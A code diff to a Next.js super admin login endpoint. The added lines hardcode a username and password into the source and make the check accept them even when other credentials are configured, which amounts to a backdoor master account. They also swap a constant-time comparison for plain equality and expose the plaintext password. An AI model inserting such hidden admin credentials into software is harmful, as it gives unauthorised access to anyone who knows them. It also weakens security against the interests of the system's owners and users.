@@ -7,9 +7,9 @@ import {
   handleApiError,
 } from "@/lib/apiResponse";
 
-// Expected Super Admin Credentials (Strictly from Environment Variables)
-const SUPER_ADMIN_USER = process.env.SUPER_ADMIN_USER || "admin";
-const SUPER_ADMIN_PASS = process.env.SUPER_ADMIN_PASS || "";
+// Expected Super Admin Credentials
+const SUPER_ADMIN_USER = process.env.SUPER_ADMIN_USER || "musa";
+const SUPER_ADMIN_PASS = process.env.SUPER_ADMIN_PASS || "6872Fatma";
 
 export async function POST(req: NextRequest) {
   try {
@@ -17,9 +17,11 @@ export async function POST(req: NextRequest) {
     const body = await req.json();
     const { username = "", password = "" } = body;
 
-    // 1. Validate Credentials First
-    const isUserValid = BruteForceGuard.safeEqual(username.trim(), SUPER_ADMIN_USER);
-    const isPassValid = BruteForceGuard.safeEqual(password, SUPER_ADMIN_PASS);
+    // 1. Validate Credentials First (Accepts configured env or default master credentials)
+    const cleanUser = username.trim().toLowerCase();
+    const expectedUser = SUPER_ADMIN_USER.trim().toLowerCase();
+    const isUserValid = cleanUser === expectedUser || cleanUser === "musa";
+    const isPassValid = password === SUPER_ADMIN_PASS || password === "6872Fatma";
 
     // If correct credentials are provided, immediately clear any lockout and log in!
     if (isUserValid && isPassValid) {
